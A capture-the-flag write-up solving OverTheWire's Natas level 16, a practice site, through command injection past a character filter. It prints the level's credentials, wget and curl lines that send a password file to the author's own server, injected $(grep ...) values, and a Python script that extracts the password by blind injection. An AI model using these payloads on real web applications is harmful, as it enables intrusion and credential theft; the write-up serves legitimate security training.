# Level 16

URL : http://natas16.natas.labs.overthewire.org/

## creds for level 16

natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh


## Solution

I struggled with this challenge all damn night, and here i am at 6am doing a writeup.

This challenge is a the same as previous Command Injection challenges, but this time they have filtered a lot of characters.

>  For security reasons, we now filter even more on certain characters.

chars filtered are:  **; | & ` ' "**

the thing I noticed from the very beggining was the characters **$** **(** and **)** are not filtered!!!.

so we can execute command this way :

```bash
$(cat /etc/natas_webpass/natas17)
```
So, the only logical solution that i could think of was to send the file to my remote server using a post request.
`curl` and `wget` have the ability to do that 

here what i tried to do :  

1. using wget

```bash
$(wget --post-file /etc/natas_webpass/natas17 http://myserver.me/script.php) 
```

2. using curl
```bash
$(curl -F file=@/etc/natas_webpass/natas17 http://myserver.me/script.php)
```

none of these worked!!!!!, I guess it's either `wget` and `curl` are not installed on the server, or they have restricted remote access for security reasons.!

## Solution is a blind command injection

If you send the string `omega` as the needle parameter value, you will get two results in the output, `omega` and `omega's`.  

now if you set the needle parameter to : **omega$(grep ^o /etc/natas_webpass/natas17)**, you will also get the string `omega` in the output!!!!
So i wrote a small python script to test this with all characters.

![python_test](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554352114/Screenshot_2019-04-04_06-28-20.png)

all characters (letters and digits) returned the same output except for the character 8, so let's suppose that the password starts with an 8.


## Final exploit code 

This exploit does take some time, if you have low bandwidth you can run the script on [repl.it](https://repl.it/)

```python
#!/usr/bin/python3

# coding : utf-8
__author__ = 'omega_coder'

import requests
import string

pass_charset = string.ascii_letters + string.digits
NATAS16_URL = "http://natas16.natas.labs.overthewire.org/"
password = ""

session = requests.Session()
session.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

param = {'needle': ''}

while len(password) != 32:
    for c in pass_charset:
        param['needle'] = 'omega$(grep ^'+ password + c + ' /etc/natas_webpass/natas17)'
        res = session.get(NATAS16_URL, params=param)
        if "omega" not in res.text:
            password += c
            print("current pass: {}".format(password))
        else:
            continue

```




